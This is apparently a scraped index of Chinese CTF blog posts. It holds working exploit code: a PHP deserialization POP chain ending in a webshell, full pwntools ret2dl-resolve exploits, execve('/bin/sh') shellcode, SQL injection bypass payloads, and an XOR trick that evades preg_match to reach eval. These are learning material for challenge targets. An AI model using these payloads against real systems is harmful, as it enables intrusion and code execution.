url(&#x27;../index&#x27;));        &#125;    &#125;else&#123;        $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;));    &#125;&#125;\n\n顺着链子往回找，这个Profile类只有两个魔术方法\npublic function __get($name)&#123;    return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123;    if($this-&gt;&#123;$name&#125;)&#123;        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);    &#125;&#125;\n\n我们需要在call调用$this-&gt;upload_img()，也就是要$this-&gt;{$name} === ‘upload_img’。然后这边先不管因为$name我们还不知道从哪里传过来。\n几个控制器当中只有Register控制器存在destruct\npublic function __destruct()&#123;    if(!$this-&gt;registed)&#123;        $this-&gt;checker-&gt;index();    &#125;&#125;\n\n所以现在就可以知道上面的$name就是’index’，该怎么从’index’变到’upload_img’\npublic function __get($name)&#123;    return $this-&gt;except[$name];// 这里给$this-&gt;&#123;$name&#125;赋值，要使得下面的$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;，那现在后面的键是可控的payload就很好生成了&#125;public function __call($name, $arguments)&#123;    if($this-&gt;&#123;$name&#125;)&#123; // &lt;--这里就是调用 $this-&gt;index但是没有index这个属性，所以进入get        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);    &#125;&#125;\n\n最终的exp\n&lt;?phpnamespace app\\web\\controller;class Profile&#123;    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except;    public function __construct()    &#123;        $this-&gt;except = array(&#x27;index&#x27; =&gt; &#x27;img&#x27;);        $this-&gt;img = &#x27;upload_img&#x27;;        $this-&gt;ext = &#x27;png&#x27;;        $this-&gt;filename_tmp = &#x27;../public/upload/b9730141a9b1dc25bccf4fafca028590/107f23d9a1bb68ad9188843933a6065f.png&#x27;;        $this-&gt;filename = &#x27;../public/upload/b9730141a9b1dc25bccf4fafca028590/107f23d9a1bb68ad9188843933a6065f.php&#x27;;    &#125;&#125;class Register&#123;    public $checker;    public $registed;    public function __construct()    &#123;        $this-&gt;registed = false;        $this-&gt;checker = new Profile();    &#125;&#125;echo (base64_encode(serialize(new Register())));\n\n\n上传生成的payload用蚁剑连接，拿到flag\n","categories":["web-buuctf"],"tags":["upload| pop链"]},{"title":"ret2dl-runtime-resolve","url":"/2022/02/03/ret2dl-runtime-resolve/","content":"前段时间因为身体原因摆烂了一周多了，今天又才重新开始做题，报了几场比赛都没能打成就很烦。\nret2dl-runtime-resolve首先ELF文件的引用外部文件的加载方式分为三种FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在后面两种的情况下存在地址延迟加载。\nNO_RELRO\n可以看到在第一次调用read函数的时候，此时会先根据GOT表的位置进行jmp到read@plt+6的位置，然后经过两次push之后到_dl_runtime_resolve函数。\n在源码中dl_runtime_resolve函数只是call了一下_dl_fixup函数。\n#ifndef reloc_offset  # define reloc_offset reloc_arg  # define reloc_index  reloc_arg / sizeof (PLTREL)  #endif  DL_FIXUP_VALUE_TYPE  attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE  _dl_fixup (  # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS      ELF_MACHINE_RUNTIME_FIXUP_ARGS,  # endif      struct link_map *l, ElfW(Word) reloc_arg) &#123;      //获取symtab（存放dynsym的数组）      const ElfW(Sym) *const symtab          = (const void *) D_PTR (l, l_info[DT_SYMTAB]);      //获取strtab(存放符号名的数组)       const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);      //获取reloc_arg对应的rel.plt项       const PLTREL *const reloc          = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);      //获取reloc_arg对应的dynsym       const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];      const ElfW(Sym) *refsym = sym;      //指向对应的got表，以便将解析结果写回去       void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);      lookup_t result;      DL_FIXUP_VALUE_TYPE value;        /* Sanity check that we&#x27;re really looking at a PLT relocation.  */      assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);        /* Look up the target symbol.  If the normal lookup rules are not        used don&#x27;t look in the global scope.  */      if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          const struct r_found_version *version = NULL;            if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123;              const ElfW(Half) *vernum =                  (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);              ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;              version = &amp;l-&gt;l_versions[ndx];              if (version-&gt;hash == 0)                  version = NULL;          &#125;            /* We need to keep the scope around so do some locking.  This is         not necessary for objects which cannot be unloaded or when          we are not using any threads (yet).  */          int flags = DL_LOOKUP_ADD_DEPENDENCY;          if (!RTLD_SINGLE_THREAD_P) &#123;              THREAD_GSCOPE_SET_FLAG ();              flags |= DL_LOOKUP_GSCOPE_LOCK;          &#125;    #ifdef RTLD_ENABLE_FOREIGN_CALL          RTLD_ENABLE_FOREIGN_CALL;  #endif          //根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中           result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                                        version, ELF_RTYPE_CLASS_PLT, flags, NULL);            /* We are done with the global scope.  */          if (!RTLD_SINGLE_THREAD_P)              THREAD_GSCOPE_RESET_FLAG ();    #ifdef RTLD_FINALIZE_FOREIGN_CALL          RTLD_FINALIZE_FOREIGN_CALL;  #endif            //得到结果           value = DL_FIXUP_MAKE_VALUE (result,                                       sym ? (LOOKUP_VALUE_ADDRESS (result)                                              + sym-&gt;st_value) : 0);      &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;      &#125;        /* And now perhaps the relocation addend.  */      value = elf_machine_plt_value (l, reloc, value);        if (sym != NULL              &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))          value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));        /* Finally, fix up the plt itself.  */      if (__glibc_unlikely (GLRO(dl_bind_not)))          return value;      //将结果写回到got表中       return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  &#125;  \n\n根据源码内容可以看出来解析时是根据符号名的字符串来解析函数的。\n#include &lt;unistd.h&gt;  #include &lt;string.h&gt;  void fun()&#123;      char buffer[0x20];      read(0,buffer,0x200);  &#125;  int main()&#123;      fun();      return 0;  &#125;  // gcc test.c -z norelro -no-pie -fno-stack-protector -m32 -o ret2dlsolve2  \n\n现在我们创建这样一个漏洞程序。\n在NO_RELRO情况下，因为dynamic可以修改，因此，我们直接修改dynamic的strtab，将它指向我们可控的区域，然后在可控区域对应的位置布置下需要的函数的名字即可，即伪造dynstr。\n\n可以看到上面是有可读可写的权限的。\n\n指向的位置存在这样几个字符串。\nexp如下:\nfrom pwn import *r = process(&#x27;./ret2dlsolve2&#x27;)elf = ELF(&#x27;./ret2dlsolve2&#x27;)pop_ebp = 0x0804848bleave_ret = 0x08048358read_plt = elf.plt[&#x27;read&#x27;]read_plt_load = elf.plt[&#x27;read&#x27;]+6bss = elf.bss()target = 0x804961C+4payload = b&#x27;a&#x27;*(0x28+0x4)+p32(pop_ebp)+p32(bss+0x300) + \\    p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x300)+p32(0x1000)r.sendline(payload)fake_str = b&#x27;\\x00libc.so.6\\x00_IO_stdin_used\\x00system\\x00&#x27;payload = b&#x27;a&#x27;*0x4+p32(read_plt)+p32(read_plt_load) + \\    p32(0)+p32(target)+p32(0x100)payload = payload.ljust(0x50, b&#x27;\\x00&#x27;)+fake_strr.sendline(payload)payload = p32(bss+0x350)+b&#x27;;sh&#x27;r.sendline(payload)r.interactive()\n\n64位相较于32位比较类似，又因为参数是在寄存器内保存的所以，直接一次ROP即可解决。\nPARTIAL_RELRO首先再更深层次的观察_dl_runtime_resolve函数的作用。\n\n这一步和上面一样，但是上面没有提到这两个push的作用，先继续往后看。\n\n上面的0是reloc_arg，下面的0xf7ffd918则是link_map的地址。\n\n通过这个地址即可找到.dynamic的地址，也就是上图中的第三个\n\n.dynamic：是ld.so使用的动态链接信息，在/etc/ld.so.conf文件中存放着需要动态加载的目录，使用ldconfig就可以将ld.so.conf中的指定目录的库文件加载到内存中，并记录在/etc/ld.so.cache文件中。ld.so.1文件就可以在高速缓存中访问动态库文件，提高访问速度。导入动态链接库，可以在/etc/ld.so.conf文件中配置，或者使用LD_LIBRARY_PATH环境变量进行引用。\n\n再根据.dynamic的地址找到另外几个结构的地址\n\n其中的地址信息是:\n.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x0804821c\n\n.dynstr：动态链接的字符串表，保存动态链接所需的字符串。比如符号表中的每个符号都有一个 st_name(符号名)，他是指向字符串表的索引，这个字符串表可能就保存在 .dynstr，而.dynstr结构为正常的字符串数组。\n\n.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481cc\n\n.dynsym：动态链接的符号表，保存需要动态连接的符号表，而.dynsym结构如下\n\ntypedef struct&#123;  Elf32_Word    st_name; //符号名相对.dynstr起始的偏移    Elf32_Addr    st_value;  Elf32_Word    st_size;  unsigned char st_info;  unsigned char st_other;  Elf32_Section st_shndx;&#125;Elf32_Sym; \n\n.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048298\n\n.rel.plt：节的每个表项对应了所有外部过程调用符号的重定位信息。而.rel.plt结构如下\n\ntypedef struct&#123;  Elf32_Addr r_offset;//指向GOT表的指针，即该函数在got表的偏移  Elf32_Word r_info;&#125;Elf32_Rel\n\n.rel.plt 的地址加上参数 reloc_arg，即 0x08048298 + 0 -&gt; 0x08048298\n找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 rel\n\n通过rel就可以获得Elf32_Rel结构体的数据\nr_offset=0x0804a00c;r_info=0x00000107;\n\n将r_info&gt;&gt;8得到4也就得到了.dynsym中的下标。\n\n从上往下从0开始，找到与下标相同的行获得第一列的数据根据即为name_offset\n\n为什么是第一列是因为第一列的值其实就是上面写的偏移\n再根据.dynstr+name_offset获得函数名的字符串。\n\n最后再根据得到的字符串来执行函数。\n梳理一下1.首先push两个参数进入，随后执行_dl_runtime_resolve\n2.根据link_map找到.dynamic地址\n3.根据.dynamic找到.dynstr    .dynsym     .rel.plt\n4.根据reloc_arg找到Elf32_Rel的指针rel\n5.拿到r_info经过移位拿到index\n6.根据index拿到name_offset结合.dynstr计算出函数的名字\n\nrel_addr = .rel.plt_addr + reloc_arg\nfake_rel_addr = .rel.plt_addr + fake_reloc_arg\nfake_reloc_arg = fake_rel_addr - rel_addr + reloc_arg\n根据以上简单的运算就可以实现伪造rel的地址\n\n\nname_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+.dynsym_addr\nfake_name_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+fake_dynsym_addr\nr_info = (((fake_dynsym_addr - .dynsym_addr) / 16) &lt;&lt; 8) + 0x7\n这里伪造出rel当中的r_info的值\n\n\n根据上面ida调试的截图很容易可以看出来dynsym的伪造很简单只需要按照原本的模式写就行\n**fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0) **\n\n最终构造exp\nfrom pwn import *r = process(&#x27;./ret2dlsolve&#x27;)elf = ELF(&#x27;./ret2dlsolve&#x27;)read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]read_load_plt = 0x80482d0leave_ret = 0x08048378pop_ebp = 0x080484abdynstr_addr = 0x0804821cdynsym_addr = 0x080481ccrel_addr = 0x08048298bss = elf.bss()payload = b&#x27;a&#x27;*(0x28+0x4)+p32(pop_ebp)+p32(bss+0x800) + \\    p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x800)+p32(0x1000)r.sendline(payload)fake_dynsym_addr = bss+0x910system_str = bss+0x900fake_rel = p32(read_got) + \\    p32((((fake_dynsym_addr - dynsym_addr) // 16) &lt;&lt; 8) + 0x7)fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)fake_rel_addr = fake_dynsym_addr+len(fake_dynsym)bin_sh_addr = bss+0x900+len(b&#x27;system\\x00&#x27;)payload = b&#x27;a&#x27;*0x4+p32(read_load_plt)+p32(fake_rel_addr -                                          rel_addr)+p32(0)+p32(bin_sh_addr)payload += payload.ljust(0x100, b&#x27;\\x00&#x27;) + \\    b&#x27;system\\x00/bin/sh&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)payload += fake_dynsym+fake_relr.sendline(payload)r.interactive()\n\n下面是64位的情况，64位不能直接伪造rel.plt\nif (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)   &#123;     const ElfW(Half) *vernum =(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);     ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;     version = &amp;l-&gt;l_versions[ndx];     if (version-&gt;hash == 0)       version = NULL;   &#125; \n\n这里，出现了访问未映射的内存，主要原因就是reloc-&gt;r_info过大，bss段一般所在位置在0x600000然而真正的rel.plt一般在0x400000。\nif (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          ...  &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;  &#125;  \n\n解决办法是绕过这个if判断进入else。\ntypedef struct  &#123;    Elf64_Word    st_name;        /* Symbol name (string tbl index) */    unsigned char st_info;        /* Symbol type and binding */    unsigned char st_other;       /* Symbol visibility */    Elf64_Section st_shndx;       /* Section index */    Elf64_Addr    st_value;       /* Symbol value */    Elf64_Xword   st_size;        /* Symbol size */  &#125; Elf64_Sym;  \n\n如果我们伪造link_map，让sym-&gt;value为某一个已经解析了的函数地址，让l-&gt;addr为我们需要的函数地址到已知函数地址的偏移，那么l-&gt;l_addr + sym-&gt;st_value也就等于我们需要的函数地址。\n比如，如果我们把read_got-8处当作sym那么sym-&gt;st_value也就等于read的地址，并且st_other正好也不为0，同时绕过了if，一举两得。\n此时的rel结构为:\ntypedef struct&#123;  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */&#125; Elf64_Rela;/* How to extract and insert information held in the r_info field.  */#define ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)#define ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))\n\n\n在动态调试也可以看到raed在符号表中的偏移为1(0x100000007&gt;&gt;32)\n还有注意的就是我们需要伪造这个数组里的几个指针，它们分别是\nDT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)\nDT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)\nDT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)\n(其实我也不知道怎么调用的system，我猜测是因为DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);这句话的原因吧，希望知道的大师傅可以评论一下)\n综上得出exp:\nfrom pwn import *r = process(&#x27;./ret2dlsolve_64&#x27;)elf = ELF(&#x27;./ret2dlsolve_64&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)pop_rdi = 0x00000000004005c3pop_rsi_r15 = 0x00000000004005c1read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]read_load_plt = 0x4003f6bss = elf.bss()l_addr = libc.symbols[&#x27;read&#x27;]-libc.symbols[&#x27;system&#x27;]r_offset = bss+0x200payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi)+p64(0) + \\    p64(pop_rsi_r15)+p64(bss+0x100)+p64(0) + \\    p64(read_plt)+p64(elf.symbols[&#x27;fun&#x27;])r.sendline(payload)dynstr_addr = 0x400318fake_link_map_addr = bss+0x100fake_strtab = p64(0)+p64(dynstr_addr)fake_strtab_addr = fake_link_map_addr+0x8fake_symtab = p64(0)+p64(read_got-0x8)fake_symtab_addr = fake_strtab_addr+0x8*2fake_dynrel_addr = fake_symtab_addr+0x8*2fake_rel_addr = fake_dynrel_addr+0x8*2fake_dynrel = p64(0)+p64(fake_rel_addr)fake_rel = p64(r_offset)+p64(0x100000007)+p64(0)fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_relfake_link_map = fake_link_map.ljust(0x68, b&#x27;\\x00&#x27;)fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)fake_link_map += b&#x27;/bin/sh&#x27;.ljust(0x80, b&#x27;\\x00&#x27;)+p64(fake_dynrel_addr)r.sendline(fake_link_map)payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi) + \\    p64(fake_link_map_addr+0x78)+p64(read_load_plt) + \\    p64(fake_link_map_addr)+p64(0)r.sendline(payload)r.interactive()\n\n参考链接https://blog.csdn.net/seaaseesa/article/details/104478081\nhttps://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak\nhttps://blog.csdn.net/jzc020121/article/details/116312592#t3\n","categories":["pwn"],"tags":["ret2dl-runtime-resolve"]},{"title":"shellcode","url":"/2021/11/24/shellcode/","content":"shellcode理解shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。\n在pwn的过程中我们的目标一般来说都是执行system(“/bin/sh”);其实shellcode也是较为类似的，只不过是一串机器码\nx86pwntools&gt;&gt;&gt; print(shellcraft.sh())    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\\x00&#x27; */    push 0x68    push 0x732f2f2f    push 0x6e69622f    mov ebx, esp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push &#x27;sh\\x00\\x00&#x27; */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* &#x27;sh\\x00&#x27; */    mov ecx, esp    xor edx, edx    /* call execve() */    push SYS_execve /* 0xb */    pop eax    int 0x80&gt;&gt;&gt;\n\n可以很明显的看出来这个python默认生成的shellcode是32位的shellcode。\n32位的函数的参数不是栈里面的内容吗，为什么这里非要高寄存器呢？是因为这是系统调用的所以参数使用的是寄存器。\npython已经告诉我们上面的shellcode最终执行的是什么了\n\nexecve(path=’/bin///sh’, argv=[‘sh’], envp=0)\n32位的第一个参数为ebx，后面是ecx，edx\n\n&gt;&gt;&gt; print(len(asm(shellcraft.sh())))44\n\n自己编写x86 shellcode把上面的转化成十六进制代码之后求长度发现有44字节，确实是太长了，所以我们搞清楚本质就可以自己写shellcode了\n# 其实根据上面的可以看出来我们需要满足的条件有以下几条# ebx=/bin/sh# ecx=0# edx=0# eax=0xb     (系统调用号，后面有系统调用号很全的网站)# 所以根据上面的要求进行修改就好push 0x68732fpush 0x6e69622fmov ebx,espxor ecx,ecxxor edx,edxxor eax,eaxmov al,0xbint 0x80\n\n&gt;&gt;&gt; len(&#x27;\\x68\\x2F\\x73\\x68\\x00\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x31\\xC9\\x31\\xD2\\x31\\xC0\\xB0\\x0B\\xCD\\x80&#x27;)22\n\n可以看到我们就只需要22字节了省了一半，当然还可以更简短，自己下去写\namd64pwntools&gt;&gt;&gt; context.arch=&#x27;amd64&#x27;&gt;&gt;&gt; print(shellcraft.sh())    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\\x00&#x27; */    push 0x68    mov rax, 0x732f2f2f6e69622f    push rax    mov rdi, rsp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push b&#x27;sh\\x00&#x27; */    push 0x1010101 ^ 0x6873    xor dword ptr [rsp], 0x1010101    xor esi, esi /* 0 */    push rsi /* null terminate */    push 8    pop rsi    add rsi, rsp    push rsi /* &#x27;sh\\x00&#x27; */    mov rsi, rsp    xor edx, edx /* 0 */    /* call execve() */    push SYS_execve /* 0x3b */    pop rax    syscall&gt;&gt;&gt; \n\n这里的思路和x86是一样的只是使用的寄存器不相同\n自己编写x86 shellcode# 其实根据上面的可以看出来我们需要满足的条件有以下几条# rdi=/bin/sh# rsi=0# rdx=0# rax=0x3b     (系统调用号，后面有系统调用号很全的网站)# syscall      这里和x86有点区别# 所以根据上面的要求进行修改就好mov rbx,0x68732f6e69622fpush rbxpush rsppop rdixor rsi,rsixor rdx,rdxmov rax,0x3bsyscall\n\n&gt;&gt;&gt; len(&#x27;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x54\\x5F\\x48\\x31\\xF6\\x48\\x31\\xD2\\x48\\xC7\\xC0\\x3B\\x00\\x00\\x00\\x0F\\x05&#x27;)28&gt;&gt;&gt;\n\n也少了很多哈，同样也不是最少的，可以去网上搜或则自己写\n32位和64位系统调用表\nhttps://blog.k0nashi.cn/2021/09/14/syscall-table/\n","categories":["pwn"],"tags":["shellcode编写"]},{"title":"SQL注入的一些小知识点","url":"/2021/09/17/sqlinjery/","content":"绕过的内容总结得较为完整的网站:\nhttps://www.cnblogs.com/Vinson404/p/7253255.html\n  拆开： 1919810931114514+words 1919810931114514:flag words:id+data;  alter tables words rename to words1; 1919810931114514+words1;  alter tables `1919810931114514` rename to words ;words+words1;  alter tables words change flag id varchar(50); #\n\n上面是从给后端处理的值来看，上传的数值为int类型可以改变原本表的表名以及字段名，再用mysql的万能绕过语句\n&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;\n\n预编译这个还看不懂\n有过滤–或则#还是–和#都过滤时，可以使用\n1&#x27; 注入语句 or &#x27;1&#x27;=&#x27;1    这种绕过引号的方式也算是及其嚣张了\n\n空格的 URL 编码替代方法:　　　　　　%09 TAB(水平)　　　　　　%0a 新建一行　　　　　　%0c 新的一页　　　　　　%0d return功能　　　　　　%0b TAB(垂直)      （php-5.2.17,5,3,29成功）　　　　　　%a0 空格\n\n\nmysql的约束问题\n\nmysql的在实验之后，admin是可以以admin加一个加空格来写入\n\n\n无列名注入\n\n1&#x27; and (select * from(select * from 表名 as a join 表名 as b) as c)--+;1&#x27; and (select * from(select * from 表名 as a join 表名 as b using(第一个字段)) as c)--+;1&#x27; and (select * from(select * from 表名 as a join 表名 as b using(第一个字段，第二个字段)) as c)--+;\n\n// 一种基于bool值的无列表名注入假设 flag 为 flag &#123;bbbbb&#125;，对于 payload 这个两个 select 查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的 ASCII 大，不管总长度如何，ASCII 大的则大，这个不难懂，和 c 语言的 strcmp() 函数原理一样MariaDB [test]&gt; select * from flag;+----+-----------------------+| id | flag                  |+----+-----------------------+|  1 | flag&#123;this_is_a_test!&#125; |+----+-----------------------+1 row in set (0.001 sec)MariaDB [test]&gt; select ((1,&#x27;e&#x27;)&gt;(select * from flag));+--------------------------------+| ((1,&#x27;e&#x27;)&gt;(select * from flag)) |+--------------------------------+|                              0 |+--------------------------------+1 row in set (0.001 sec)MariaDB [test]&gt; select ((1,&#x27;f&#x27;)&gt;(select * from flag));+--------------------------------+| ((1,&#x27;f&#x27;)&gt;(select * from flag)) |+--------------------------------+|                              0 |+--------------------------------+1 row in set (0.001 sec)MariaDB [test]&gt; select ((1,&#x27;g&#x27;)&gt;(select * from flag));+--------------------------------+| ((1,&#x27;g&#x27;)&gt;(select * from flag)) |+--------------------------------+|                              1 |+--------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select ((1,&#x27;fm&#x27;)&gt;(select * from flag));+---------------------------------+| ((1,&#x27;fm&#x27;)&gt;(select * from flag)) |+---------------------------------+|                               1 |+---------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select ((1,&#x27;fl&#x27;)&gt;(select * from flag));+---------------------------------+| ((1,&#x27;fl&#x27;)&gt;(select * from flag)) |+---------------------------------+|                               0 |+---------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; \n\n\n堆叠注入\n\n源码:$sql=&quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;;\n\nMariaDB [test]&gt; select * from test;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | admin      | flag1    ||  2 | admin      | flag1    ||  3 | database() | test     |+----+------------+----------+3 rows in set (0.001 sec)MariaDB [test]&gt; select 1||username from test;+-------------+| 1||username |+-------------+|           1 ||           1 ||           1 |+-------------+3 rows in set (0.001 sec)MariaDB [test]&gt; select id,1||username from test;+----+-------------+| id | 1||username |+----+-------------+|  1 |           1 ||  2 |           1 ||  3 |           1 |+----+-------------+3 rows in set (0.001 sec)MariaDB [test]&gt; select password,1||username from test;+----------+-------------+| password | 1||username |+----------+-------------+| flag1    |           1 || flag1    |           1 || test     |           1 |+----------+-------------+3 rows in set (0.000 sec)MariaDB [test]&gt; select *,1||username from test;+----+------------+----------+-------------+| id | username   | password | 1||username |+----+------------+----------+-------------+|  1 | admin      | flag1    |           1 ||  2 | admin      | flag1    |           1 ||  3 | database() | test     |           1 |+----+------------+----------+-------------+3 rows in set (0.001 sec)MariaDB [test]&gt;\n\n解法二：\nset sql_mode=PIPES_AS_CONCAT  # 让管道符作为concat1;set sql_mode=PIPES_AS_CONCAT;selet 1结合源码就是:select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag;\n\n\n不使用select查表\n\nhandler table_name open;handler table_name first;handler table_name next;handler table_name next;handler table_name next;...handler table_name close;\n\n","categories":["web"],"tags":["sql"]},{"title":"在刚开始学习pwn的小问题","url":"/2021/09/17/study-pwn1/","content":"\n关于stack overflow的学习\n一般来说会出现get函数，这个函数不受保护可以无限写入，导致可以修改栈内部的内容，填充垃圾数据然后在需要的地方修改到我们需要的地址达到返回shell的效果。\n还可能会出现scanf函数并且函数后面的限制长度会比较长可以实现栈溢出的效果。\n\nROP\n\n\n上图就是执行system的流程，但是我们需要获得反弹shell的话就必须执行system(‘/bin/sh’)需要参数，所以我们需要给system参数。\n当我们跳转到函数地址的时候为了保存数据，会对栈进行操作，x86程序的操作的流程是:\n\n所以可以把system的参数放到栈里面，这样的话就可以填充一个位置的垃圾数据，然后紧跟着往栈里面放需要的参数也就是’/bin/sh’的地址。\n在ubuntu18以上，通过栈溢出ret到system需要注意栈平衡\n","categories":["pwn"],"tags":["rop stack overflow"]},{"title":"SUCTF_2019_EasyWeb","url":"/2021/09/18/suctf-2019-EasyWeb/","content":"`\n题目源码:\n&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);        $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) )    die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;\n\n绕过 preg_match 执行 eval编写脚本构造出$_GET[xxx]\n&lt;?php$l = &quot;&quot;;$r = &quot;&quot;;$argv = str_split(&quot;_GET&quot;);for ($i = 0; $i &lt; count($argv); $i++) &#123;    for ($j = 0; $j &lt; 255; $j++) &#123;        $k = chr($j) ^ chr(255);      //dechex(255) = ff        if ($k == $argv[$i]) &#123;            if ($j &lt; 16) &#123;                $l .= &quot;%ff&quot;;                $r .= &quot;%0&quot; . dechex($j);                continue;            &#125;            $l .= &quot;%ff&quot;;            $r .= &quot;%&quot; . dechex($j);            continue;        &#125;    &#125;&#125;echo &#x27;$&#123;&#x27; . $l . &#x27;^&#x27; . $r . &#x27;&#125;&#x27;;// 最终的结果为：$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;// 加上参数$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;\n\n第一步的 payload 就是:\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo\n\n然后再 php 可以找到自己的 